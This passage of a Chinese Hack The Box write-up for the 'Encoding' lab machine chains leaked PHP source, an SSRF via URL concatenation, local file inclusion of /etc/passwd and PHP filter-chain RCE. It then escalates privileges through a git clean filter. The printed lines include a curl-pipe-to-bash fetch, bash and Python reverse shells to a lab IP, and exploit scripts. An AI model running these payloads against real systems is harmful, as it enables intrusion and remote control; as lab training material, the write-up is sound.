class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../../../utils.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = file_get_contents(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists(<span class="string">&#x27;file_url&#x27;</span>, <span class="variable">$jsondata</span>)) &#123;</span><br><span class="line">        <span class="variable">$data</span> = get_url_content(<span class="variable">$jsondata</span>[<span class="string">&#x27;file_url&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$action</span>  === <span class="string">&#x27;str2hex&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; str2hex(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>  (<span class="variable">$action</span> === <span class="string">&#x27;hex2str&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span> =&gt; hex2str(<span class="variable">$data</span>) ]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;md5&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; md5(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;sha1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; sha1(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urlencode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urlencode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;urldecode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; urldecode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64encode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_encode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;b64decode&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;data&#x27;</span>=&gt; base64_decode(<span class="variable">$data</span>)]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span>=&gt; <span class="string">&#x27;Invalid action&#x27;</span>], <span class="number">404</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看第一个<code>api.haxtables.htb/handler.php</code>的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/api/handler.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Global functions</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsonify</span>(<span class="params"><span class="variable">$body</span>, <span class="variable">$code</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$code</span>) &#123;</span><br><span class="line">        http_response_code(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    header(<span class="string">&#x27;Content-Type: application/json; charset=utf-8&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$body</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_included_contents</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">return</span> ob_get_clean();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_url_content</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$domain</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">    <span class="keyword">if</span> (gethostbyname(<span class="variable">$domain</span>) === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    jsonify([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Unacceptable URL&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$url_content</span> =  curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$url_content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_api_call</span>(<span class="params"><span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span> = <span class="literal">false</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$is_file</span>) &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; file_get_contents(<span class="variable">$data</span>),</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$post</span> = [</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span>,</span><br><span class="line">            <span class="string">&#x27;action&#x27;</span> =&gt; <span class="variable">$action</span>,</span><br><span class="line">            <span class="string">&#x27;uri_path&#x27;</span> =&gt; <span class="variable">$uri_path</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_CONNECTTIMEOUT,<span class="number">2</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">    curl_setopt (<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">0</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, json_encode(<span class="variable">$post</span>));</span><br><span class="line">    curl_setopt( <span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="keyword">array</span>(<span class="string">&#x27;Content-Type:application/json&#x27;</span>));</span><br><span class="line">    <span class="variable">$response</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$response</span>;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>函数<code>get_url_content</code>禁止对127.0.0.1进行访问</p><p>页面调用功能时请求为<code>haxtables.htb/handler.php</code><br />查看其代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py /var/www/html/handler.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../api/utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;data_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$is_file</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jsondata</span> = json_decode(file_get_contents(<span class="string">&#x27;php://input&#x27;</span>), <span class="literal">true</span>);</span><br><span class="line">    <span class="variable">$action</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="variable">$uri_path</span> = <span class="variable">$jsondata</span>[<span class="string">&#x27;uri_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>(<span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;action&#x27;</span>, <span class="variable">$jsondata</span>) || !array_key_exists(<span class="string">&#x27;uri_path&#x27;</span>, <span class="variable">$jsondata</span>)) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> jsonify([<span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Insufficient parameters!&#x27;</span>]);</span><br><span class="line">        <span class="comment">// echo jsonify([&#x27;message&#x27; =&gt; file_get_contents(&#x27;php://input&#x27;)]);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = make_api_call(<span class="variable">$action</span>, <span class="variable">$data</span>, <span class="variable">$uri_path</span>, <span class="variable">$is_file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>函数<code>make_api_call</code>无限制</p><p>但存在URL拼接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://api.haxtables.htb&#x27;</span> . <span class="variable">$uri_path</span> . <span class="string">&#x27;/index.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p>前面的内容用<code>@</code>注释<br />后面的内容用<code>&amp;</code>注释</p><p>修改<code>exp.py</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">json_data = &#123;</span><br><span class="line">    <span class="string">&#x27;action&#x27;</span>: <span class="string">&#x27;b64encode&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri_path&#x27;</span> : <span class="string">&#x27;@image.haxtables.htb/actions/action_handler.php?page=%s&amp;&#x27;</span> % sys.argv[<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line">res = req.post(<span class="string">&#x27;http://haxtables.htb/handler.php&#x27;</span>, json=json_data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>再次尝试LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py /etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:104::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:105:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:106:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:107:113::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uuidd:x:108:114::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:109:115::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:111:117::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:112:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">svc:x:1000:1000:svc:&#x2F;home&#x2F;svc:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:999:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">fwupd-refresh:x:113:120:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>使用<code>php_filter_chain_generator</code>生成PAYLOAD并进行RCE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/synacktiv/php_filter_chain_generator</span><br><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php system(&quot;curl http://10.10.*.*/bfl.sh | bash&quot;);?&gt;     &#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.2/9998 0&gt;&amp;1&#x27;</span> &gt; /tmp/bfl.sh</span><br><span class="line"><span class="built_in">cd</span> /tmp/ &amp;&amp; python -m http.server 80 &amp;</span><br><span class="line">python exp.py PAYLOAD</span><br></pre></td></tr></table></figure><p>获取反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for www-data on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on encoding:</span><br><span class="line">    (svc) NOPASSWD: &#x2F;var&#x2F;www&#x2F;image&#x2F;scripts&#x2F;git-commit.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$u</span> ]]; <span class="keyword">then</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m <span class="string">&quot;Commited from API!&quot;</span> --author=<span class="string">&quot;james &lt;james@haxtables.htb&gt;&quot;</span>  --no-verify</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;0.0.0.0&#x27;,9995));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span> &gt; /tmp/BFL</span><br><span class="line">chmod +x /tmp/BFL</span><br><span class="line">git init</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;*.php filter=indent&#x27;</span> &gt; /var/www/image/.git/info/attributes</span><br><span class="line">git config filter.indent.clean /tmp/BFL</span><br><span class="line">sudo -u svc /var/www/image/scripts/git-commit.sh</span><br></pre></td></tr></table></figure><blockquote><p>Git提供了一种过滤机制，允许用户在文件检出或提交到Git存储库时将自定义脚本应用于文件。<br />过滤机制由两种类型的过滤器组成：clean过滤器和smudge过滤器。clean过滤器用于在将文件提交到Git存储库之前转换文件的内容。smudge过滤器用于在从Git存储库检出文件时转换文件的内容。<br />在这种情况下，攻击者创建了一个clean过滤器，该过滤器执行一个Python脚本，该脚本打开一个反向shell到指定的IP地址和端口。攻击者已将Git配置为对/var/www/image目录中的所有PHP文件使用此clean过滤器。这意味着每当该目录中的PHP文件提交到Git存储库时，将应用clean过滤器，并执行Python脚本。<br />Generated By ChatGPT</p></blockquote><p>这个地方反弹Shell不能弹到本机<br />疑似是网络问题，不能通过VPN的网络接口接收python reverse shell<br />只能在靶机上再开个shell然后nc监听</p><p>查看<code>user.txt</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/svc/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">46b119076b33b6baadfb2467e0128703</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 